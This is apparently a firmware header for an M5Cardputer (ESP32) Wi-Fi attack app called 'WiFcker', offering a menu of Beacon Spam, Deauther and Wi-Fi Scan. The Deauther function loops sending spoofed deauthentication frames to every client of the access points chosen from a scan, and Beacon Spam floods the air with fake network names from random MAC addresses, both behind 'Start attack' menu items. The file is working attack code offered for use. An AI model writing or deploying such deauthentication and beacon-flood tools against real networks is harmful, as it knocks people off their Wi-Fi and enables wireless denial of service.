#ifndef WIFCKER_H
#define WIFCKER_H

#include <M5Cardputer.h>

#include "firmware/menu.h"
#include "firmware/includes/wifi.h"

int charset;
char *generate_ssid() {
    char *ssid;

    if (charset == 3) {
        const char *base_ssid = "CamionDeLaDGSI"; // Use const char* for literals
        int rand_num = rand() % 9998;

        char buffer[10];
        int num_digits = snprintf(buffer, sizeof(buffer), "%d", rand_num);

        size_t new_length = strlen(base_ssid) + 1 + num_digits + 1;
        char *new_ssid = (char *)malloc(new_length); // Explicit cast for malloc

        snprintf(new_ssid, new_length, "%s-%d", base_ssid, rand_num);
        return new_ssid;
    }

    const char *hiragana[] = {"あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ", "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と"};
    const char *katakana[] = {"ア", "イ", "ウ", "エ", "オ", "カ", "キ", "ク", "ケ", "コ", "サ", "シ", "ス", "セ", "ソ", "タ", "チ", "ツ", "テ", "ト"};
    const char *cyrillic[] = {"А", "Б", "В", "Г", "Д", "Е", "Ё", "Ж", "З", "И", "Й", "К", "Л", "М", "Н", "О", "П", "Р", "С", "Т", "У", "Ф", "Х", "Ц", "Ч", "Ш", "Щ", "Ъ", "Ы", "Ь", "Э", "Ю", "Я"};

    int num_chars = 8;
    ssid = (char *)malloc(num_chars * 3 + 1);

    if (!ssid) return NULL;

    ssid[0] = '\0';

    for (int i = 0; i < num_chars; i++) {
        const char *char_utf8;
        switch (charset) {
            case 0:
                char_utf8 = hiragana[rand() % (sizeof(hiragana) / sizeof(hiragana[0]))];
                break;
            case 1:
                char_utf8 = katakana[rand() % (sizeof(katakana) / sizeof(katakana[0]))];
                break;
            case 2:
            default:
                char_utf8 = cyrillic[rand() % (sizeof(cyrillic) / sizeof(cyrillic[0]))];
                break;
        }
        strcat(ssid, char_utf8);
    }

    return ssid;
}

void trollBeacon() {
    char *ssid = generate_ssid();

    if (ssid == NULL) {
        printf("Failed to generate SSID\n");
        return;
    }

    uint8_t mac_addr[6];
    generate_random_mac(mac_addr);

    for (int p = 0; p < 1; p++) {
        send_beacon(ssid, mac_addr, CHANNEL);
    }

    free(ssid);
}

void trollDeauth(const uint8_t *client_addr, const uint8_t *ap_addr) {
    uint8_t source_addr[6];
    generate_random_mac(source_addr);

    send_deauth(source_addr,client_addr,ap_addr);
}

static int packet_count = 0;
TimerHandle_t pps_timer;

void pps_timer_callback(TimerHandle_t xTimer) {
    char buffer[32];
    snprintf(buffer, sizeof(buffer), "%d packets/sec", packet_count);

    M5.Display.clear();
    M5.Display.setCursor(0, 20);
    M5.Display.println("Attacking...");
    M5.Display.println(buffer);

    packet_count = 0;
}

void init_pps_timer() {
    pps_timer = xTimerCreate("PPS_Timer", pdMS_TO_TICKS(1000), pdTRUE, (void *)0, pps_timer_callback);
    if (pps_timer == NULL) {
        printf("Failed to create timer\n");
    } else {
        xTimerStart(pps_timer, 0);
    }
}

void stop_pps_timer() {
    if (pps_timer != NULL) {
        xTimerStop(pps_timer, 0);
        xTimerDelete(pps_timer, 0);
        pps_timer = NULL;
    }
}

int BeaconSpam() {
    charset = 0;

    int Selector = 0;
    struct menu Menu;

    Menu.name = "~/WiFi/Beacon Spam";
    Menu.length = 2;  // charset, statack
    Menu.elements = new item[Menu.length];

    strcpy(Menu.elements[0].name, "Charset");
    Menu.elements[0].type = 0;
    Menu.elements[0].length = 4;
    Menu.elements[0].selector = 0;
    Menu.elements[0].options[0] = "hig";
    Menu.elements[0].options[1] = "kat";
    Menu.elements[0].options[2] = "cyr";
    Menu.elements[0].options[3] = "CDLD";
    Menu.elements[0].options[4] = NULL; // Terminate options explicitly


    strcpy(Menu.elements[1].name, "Start attack");
    Menu.elements[1].type = 1;
    Menu.elements[1].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[1].options[i] = NULL;
    }

    drawMenu(Menu, Selector);

    int UPp, DOWNp, LEFTp, RIGHTp, SELECTp, RETURNp;

    while (1) {
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange()) {
            UPp = M5Cardputer.Keyboard.isKeyPressed(';');
            DOWNp = M5Cardputer.Keyboard.isKeyPressed('.');
            LEFTp = M5Cardputer.Keyboard.isKeyPressed(',');
            RIGHTp = M5Cardputer.Keyboard.isKeyPressed('/');
            SELECTp = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
            RETURNp = M5Cardputer.Keyboard.isKeyPressed('`');

            if (RETURNp) {
                return 0;
            }
            else if (UPp) {
                Selector = intChecker(Selector - 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (DOWNp) {
                Selector = intChecker(Selector + 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (LEFTp && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector - 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (RIGHTp  && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector + 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            if (SELECTp) {
                M5GFX_clear_screen();
                switch (Selector) {
                    case 1:  // Start attack
                        init_pps_timer();
                        vTaskDelay(pdMS_TO_TICKS(100));
                        charset = Menu.elements[0].selector;
                        int wait = 1;
                        while (wait) {
                            M5Cardputer.update();
                            if (M5Cardputer.Keyboard.isPressed()) {
                                wait = 0;
                            }
                            packet_count++;
                            trollBeacon();
                            for (int i = 0; i < 10; i++) {
                                vTaskDelay(pdMS_TO_TICKS(0));  // Yield the processor for a short duration
                            }
                        }
                        stop_pps_timer();
                        break;
                }
            }
            drawMenu(Menu, Selector);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

int Deauther() {
    int Selector = 0;
    struct menu Menu;

    Menu.name = "~/WiFi/Deauther";
    Menu.length = 3;  // Select Ap, clientmac, statack
    Menu.elements = new item[Menu.length];

    strcpy(Menu.elements[0].name, "Select AP");
    Menu.elements[0].type = 1;
    Menu.elements[0].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[0].options[i] = NULL;
    }

    strcpy(Menu.elements[1].name, "Client mac");
    Menu.elements[1].type = 0;
    Menu.elements[1].length = 2;
    Menu.elements[1].selector = 0;
    Menu.elements[1].options[0] = "ff..";
    Menu.elements[1].options[1] = "ff..";
    Menu.elements[1].options[2] = NULL; // Terminate options explicitly

    strcpy(Menu.elements[2].name, "Start attack");
    Menu.elements[2].type = 1;
    Menu.elements[2].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[2].options[i] = NULL;
    }

    drawMenu(Menu, Selector);

    int UPp, DOWNp, LEFTp, RIGHTp, SELECTp, RETURNp;
    int aps_count = 0;  // Initialize the count
    AP* aps = NULL;     // Declare the pointer here


    while (1) {
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange()) {
            UPp = M5Cardputer.Keyboard.isKeyPressed(';');
            DOWNp = M5Cardputer.Keyboard.isKeyPressed('.');
            LEFTp = M5Cardputer.Keyboard.isKeyPressed(',');
            RIGHTp = M5Cardputer.Keyboard.isKeyPressed('/');
            SELECTp = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
            RETURNp = M5Cardputer.Keyboard.isKeyPressed('`');

            if (RETURNp) {
                return 0;
            }
            else if (UPp) {
                Selector = intChecker(Selector - 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (DOWNp) {
                Selector = intChecker(Selector + 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (LEFTp && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector - 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (RIGHTp  && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector + 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            if (SELECTp) {
                M5GFX_clear_screen();
                switch (Selector) {
                    case 0: // Select AP
                        M5GFX_display_text(0, 0, "Scanning...\r", TFT_WHITE);
                        aps = select_wifi_menu(&aps_count);
                        M5GFX_display_text(0, 0, "", TFT_WHITE);
                        M5GFX_clear_screen();

                        for (int i = 0; i < aps_count; i ++) {
                            printf ("%d: %s\n", i, aps[i].name);
                        }


                        if (!aps) {
                            printf("No access points Selected.\n");
                            return -1;
                        }

                        break;
                    case 1:
                        break;
                    case 2:  // Start attack
                        init_pps_timer();
                        vTaskDelay(pdMS_TO_TICKS(100));
                        M5Cardputer.update();
                        int wait = 1;
                        while (wait) {
                            M5Cardputer.update();
                            if (M5Cardputer.Keyboard.isPressed()) {
                                wait = 0;
                            }
                            packet_count++;

                            uint8_t client[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

                            for (int i = 0; i < aps_count; i ++) {
                                trollDeauth(client, aps[i].address);

                                uint8_t *mac_address;

                                mac_address = aps[i].address;

                                printf ("DEAUTH: ");
                                printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
                                       mac_address[0], mac_address[1], mac_address[2],
                                       mac_address[3], mac_address[4], mac_address[5]);


                                for (int i = 0; i < 10; i++) {
                                    vTaskDelay(pdMS_TO_TICKS(0));  // Yield the processor for a short duration
                                }
                            }
                        }
                        stop_pps_timer();
                        break;
                }
            }
            drawMenu(Menu, Selector);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}


int menuTask() {
    srand(time(NULL));
    int Selector = 0;
    struct menu Menu;

    Menu.name = "~/WiFi";
    Menu.length = 3;  // BeaconSpam, Deauther, WifiScan
    Menu.elements = new item[Menu.length];

    strcpy(Menu.elements[0].name, "Beacon Spam");
    Menu.elements[0].type = 1;
    Menu.elements[0].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[0].options[i] = NULL;
    }

    strcpy(Menu.elements[1].name, "Deauther");
    Menu.elements[1].type = 1;
    Menu.elements[1].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[1].options[i] = NULL;
    }

    strcpy(Menu.elements[2].name, "Wifi Scan");
    Menu.elements[2].type = 1;
    Menu.elements[2].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[2].options[i] = NULL;
    }

    drawMenu(Menu, Selector);

    int UPp, DOWNp, SELECTp, RETURNp;

    while (1) {
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange()) {
            UPp = M5Cardputer.Keyboard.isKeyPressed(';');
            DOWNp = M5Cardputer.Keyboard.isKeyPressed('.');
//            LEFTp = M5Cardputer.Keyboard.isKeyPressed(',');
//            RIGHTp = M5Cardputer.Keyboard.isKeyPressed('/');
            SELECTp = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
            RETURNp = M5Cardputer.Keyboard.isKeyPressed('`');

            if (RETURNp) {
                return 0;
            }
           else if (UPp) {
                Selector = intChecker(Selector - 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (DOWNp) {
                Selector = intChecker(Selector + 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            if (SELECTp) {
                switch (Selector) {
                    int ret;
                    case 0:  // BeaconSpam
                        M5GFX_clear_screen();
                        printf ("beacon_spam_task - starting");
                        ret = BeaconSpam();
                        if (ret != 0) {
                            printf("Error in app.");
                        }
                        break;
                    case 1:  // Deauther
                        M5GFX_clear_screen();
                        printf ("beacon_spam_task - starting");
                        ret = Deauther();
                        if (ret != 0) {
                            printf("Error in app.");
                        }
                        break;
                    case 2: // Scan Wifi
                        M5GFX_clear_screen();
                        M5GFX_display_text(0, 0, "Scanning...", TFT_WHITE);
                        int ap_count;
                        AP *ap_list = scan_wifi_ap(&ap_count);
                        M5GFX_display_text(0, 0, "", TFT_WHITE);
                        M5GFX_clear_screen();
                        if (ap_list) {
                            M5.Display.printf("Found %d APs\n", ap_count);
                            for (int i = 0; i < ap_count; i++) {
                                M5.Display.printf("[%d]: '%s'  " MACSTR, i, ap_list[i].name, MAC2STR(ap_list[i].address));
                                M5.Display.printf("\n");
                            }
                            free(ap_list);
                        } else {
                            M5.Display.printf("Wi-Fi AP scan failed.\n");
                        }
                        int wait = 1;
                        while (wait) {
                            M5Cardputer.update();
                            if (M5Cardputer.Keyboard.isPressed()) {
                                wait = 0;
                            }
                            vTaskDelay(pdMS_TO_TICKS(30));
                        }
                        break;
                }
            }
            drawMenu(Menu, Selector);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

int APP_WiFcker() {
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&wifi_cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_channel(CHANNEL, WIFI_SECOND_CHAN_NONE));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(20));

    int ret = menuTask();

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(esp_wifi_deinit());

    return ret;
}
#endif
